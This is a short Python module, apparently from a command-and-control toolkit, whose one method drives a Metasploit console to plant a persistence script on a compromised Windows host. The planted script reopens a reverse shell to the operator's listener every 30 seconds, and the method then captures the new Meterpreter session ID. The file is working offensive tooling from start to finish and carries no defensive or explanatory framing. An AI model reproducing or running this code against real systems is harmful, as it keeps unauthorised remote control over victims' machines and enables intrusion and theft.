# Module providing Priviledge Escalation exploits
#
# Author: Daniel Crouch
# Date created: March 2020

import os
import re
import time
import subprocess
from pathlib import Path
from dotenv import load_dotenv
# global variables
import config


################################################################################
# Priviledge Escalation commands
################################################################################

class Control(object):
    """
    Defines a collection command and control (c2c) commands and exploits
    """

    def persistant_reverse_tcp(self, target_name, verbose = True):
        """
        Create a startup script on remote host for persistant call back
        """
        target = config.TARGETS[target_name]
        if not target.session_id:
            raise Exception("shell session with target not active")
            return
        # existing active session
        session = target.session_id
        # open session with target
        config.MSFCONSOLE.open_session(target_name)
        # deliver persistance payload
        cmd = "run persistence -A -L c:\\\\ -X 30 -p 7546 -r "
        cmd += config.MSF_LHOST
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True, wait=10)
        # background session
        config.MSFCONSOLE.background_session(target_name)
        # handle result
        for line in msf_reply.splitlines():
            if 'Meterpreter session' in line:
                words = line.split()
                target.session_id = words[3]
                print("[*] exploit successful, new session id:", words[3])


#
